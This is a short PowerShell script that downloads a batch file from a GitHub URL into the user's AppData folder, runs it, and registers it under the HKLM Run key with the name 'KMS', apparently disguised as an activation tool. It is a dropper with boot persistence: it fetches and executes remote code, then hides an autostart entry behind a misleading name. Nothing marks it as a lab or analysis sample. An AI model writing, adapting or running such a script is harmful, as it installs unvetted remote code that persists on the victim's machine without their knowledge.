# URL of the binary file to download
$url = "https://github.com/qufyu/0024/blob/main/main.bat"

# Destination path in AppData directory
$destinationPath = "$env:APPDATA\main.bat"

# Download the binary file
Invoke-WebRequest -Uri $url -OutFile $destinationPath

# Check if the download was successful
if (Test-Path $destinationPath) {
    Write-Host "Binary file downloaded successfully to $destinationPath"
    
    # Execute the binary file (optional)
    Start-Process -FilePath $destinationPath
} else {
    Write-Host "Failed to download the binary file."
}

# Specify the name you want for the registry entry
$registryEntryName = "KMS"

# Define the registry path
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Construct the registry key and set its value to the script path
Set-ItemProperty -Path $registryPath -Name $registryEntryName -Value $destinationPath
